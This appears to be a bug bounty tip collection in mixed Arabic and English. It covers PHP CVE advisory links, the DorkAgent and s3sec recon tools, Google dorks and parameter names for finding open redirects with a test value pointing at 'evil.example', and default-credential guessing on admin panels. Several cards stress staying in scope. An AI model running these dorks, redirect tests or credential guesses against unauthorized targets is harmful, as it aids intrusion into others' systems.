Payload / Code: CVE-2026-109618 — [https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w\\nCVE-2026-109619](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w%5CnCVE-2026-109619) — [https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp\\nNational](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp%5CnNational) advisory: [https://digital.nhs.uk/cyber-alerts/2026/cc-4875](https://digital.nhs.uk/cyber-alerts/2026/cc-4875)
Source: PHP upstream security advisories; NHS England Digital advisory published 2026-10-21.

Title: DorkAgent — automate scoped dork research
How It Works: أداة لتجميع/تشغيل عمليات dorking بصورة منظمة. استخدمها فقط على اسم المؤسسة أو النطاقات المصرح بها، وراجع كل نتيجة يدويًا: هل هي أصل حالي؟ هل السر حقيقي أم مثال/fixture؟ هل يوجد دليل على ملكية الهدف؟ لا تستخدم أي credentials مكشوفة.
Payload / Code: Repository: [https://github.com/yee-yore/DorkAgent\\nWorkflow](https://github.com/yee-yore/DorkAgent%5CnWorkflow): define in-scope domain/org → run passive queries → deduplicate results → manually validate → redact secrets in notes.

Title: S3 bucket misconfiguration triage with s3sec
How It Works: استخدم s3sec كأداة تحقق موجهة على Buckets مرتبطة بأصول داخل نطاق البرنامج. ابدأ بتحديد الـ bucket من ملفات JS أو مصادر recon، ثم افحص الصلاحيات بأقل طلبات ممكنة. فرّق بين listing/read/write/delete؛ لا ترفع أو تحذف ملفات ولا تختبر بيانات مستخدمين. سجّل الدليل الآمن واسم الـ bucket والـ policy الظاهرة، وتوقف إذا ظهر محتوى حساس.
Payload / Code:
Tool: s3sec — لم أتمكن من تأكيد رابط المستودع الأصلي من المصدر المرسل، لذلك لم أضع رابطًا تخمينيًا. أضف رابط المصدر الصحيح قبل التشغيل.
Checklist: scope → identify bucket → inspect permissions → minimal proof → redact sensitive data.
Source: User-provided collection: s3sec S3 read/write/delete permission checker; verify exact repository URL before use.

Title: Open Redirect — Google dorks and common parameter names
How It Works: Search engines index login and redirect endpoints. Dorks with inurl:return\_to (and similar) surface candidates; then test parameter values for open redirect. Long list of parameter names increases coverage on login/logout flows.

site:.[target.com](http://target.com) inurl:return\_to
site:.[target.com](http://target.com) inurl:redirect
site:.[target.com](http://target.com) inurl:url=
site:.[target.com](http://target.com) inurl:next=

Params: return, return\_to, return\_url, redirect, redirect\_to, redirect\_uri, url, next, goto, destination, continue, callback, rurl, dest, forward, return\_path

Test: //evil.example
Source: Anton — Google Dork for Open Redirect or XSS URLs · Sep 2023

Title: Discover quieter bug bounty programs via Slack dork

How It Works: Some internal or legacy admin panels still use predictable defaults built from the company name. Only test on in-scope login surfaces with program-allowed credentials testing; never spray broadly.
